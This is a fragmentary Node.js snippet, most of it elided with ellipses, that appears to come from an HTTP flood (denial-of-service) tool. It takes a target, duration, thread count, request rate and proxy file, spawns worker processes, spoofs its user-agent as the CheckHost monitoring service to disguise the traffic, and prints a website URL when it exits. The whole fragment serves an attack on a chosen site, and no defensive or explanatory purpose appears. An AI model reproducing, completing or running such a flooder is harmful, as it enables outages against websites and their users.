...
if (process.argv.length < 7) {
    console.log(`Usage: ${process.argv[1]} target time threads reqs proxyfile`)
    process.exit(1)
}
...
if (cluster.isMaster) {
   ...
   for (let ads = 0; ads < threads; ads++) {
	...
	function main() {
		...
		payload['user-agent'] = 'CheckHost (https://check-host.net/)';		
		...
		setTimeout(function() {
		  console.clear();
		  console.log('https://web.dodanhtai.site/');
		  process.exit()
		}, time * 1000);
	}
	main();
